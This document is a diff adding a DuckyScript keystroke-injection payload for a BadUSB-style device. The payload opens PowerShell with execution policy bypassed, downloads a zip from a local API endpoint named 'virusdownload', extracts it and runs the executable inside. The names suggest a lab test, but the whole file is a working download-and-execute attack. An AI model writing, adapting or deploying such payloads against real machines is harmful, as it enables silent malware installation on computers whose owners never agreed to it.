@@ -1,0 +1,37 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+DELAY 5000
+ENTER
+DELAY 500
+STRING $testPath = 'C:\\TestVirusPath'
+DELAY 2000
+ENTER
+STRING $apiKey = 'superSecretApiKey'
+DELAY 2000
+ENTER
+STRING $url = 'http://127.0.0.1:5000/api/virusdownload'
+DELAY 2000
+ENTER
+STRING $zipPath = \"$testPath\\downloaded.zip\"
+DELAY 2000
+ENTER
+STRING $extractPath = \"$testPath\\extracted\"
+DELAY 2000
+ENTER
+STRING $exePath = \"$extractPath\\test_virus.exe\"
+DELAY 2000
+ENTER
+STRING if (-Not (Test-Path -Path $testPath)) { New-Item -ItemType Directory -Path $testPath -Force }
+DELAY 2000
+ENTER
+STRING Invoke-WebRequest -Uri $url -Method POST -Headers @{'Content-Type'='application/json'} -Body (@{api_key=$apiKey} | ConvertTo-Json) -OutFile $zipPath
+DELAY 2000
+ENTER
+STRING Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+DELAY 2000
+ENTER
+STRING Start-Process -FilePath $exePath -Wait
+DELAY 2000
+ENTER
